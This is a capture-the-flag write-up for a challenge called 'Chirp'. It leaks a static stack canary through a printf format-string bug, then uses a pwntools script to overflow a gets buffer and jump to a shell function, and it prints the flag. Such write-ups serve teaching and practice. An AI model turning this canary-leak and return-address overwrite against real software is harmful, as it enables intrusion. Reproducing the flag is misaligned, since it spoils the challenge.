# Chirp
## Mitigations
```

```
## Solution
We are given a .s file that contains the assembly for some functions in the binary, alongside the binary itself. From the .s file, we can see a function that pops a shell, so we can assume that we need to run that function somehow. 
```asm
shell:
    # here's a free shell function!
    # too bad you can't use it!
    leaq   bin_sh(%rip), %rdi
    call   system
    ret

    .type set_canary, @function
```
We also know there is a canary in the program thanks to the challenge description.

Looking at the binary in Ghidra, we can see a few key vulnerabilities. Firstly, we have a `gets` call reading into a 24 byte buffer. Secondly, the input is passed into a printf call as the first argument, meaning that there is a printf bug we can exploit. If we use this knowledge to read the stack values, we can not only read the value of the canary, but also upon reading the canary value across multiple runs, we find the value to be static.
\nRun 1:
```
Enter name: $ %9$p
Hello, 0x9114730499870181
```
Run 2:
```
Enter name: $ %9$p
Hello, 0x9114730499870181
```

Since there is no PIE/ASLR, all we need to do is a simple buffer overflow, making sure the canary does not change, and override the ret address to the address of `shell`.

## Script
```py
from pwn import *
from time import sleep

p = remote('chirp.challs.pwnoh.io', 1337, ssl=True)

p.sendline(b"a"*24+p64(0x9114730499870181)+b'a'*(8*1)+p64(0x4011b6))

p.interactive()
```
## Flag
`Flag: bctf{r3Al_pR0gramm3rs_d0n7_Wr1t3_th31R_0wn_cRypTo}`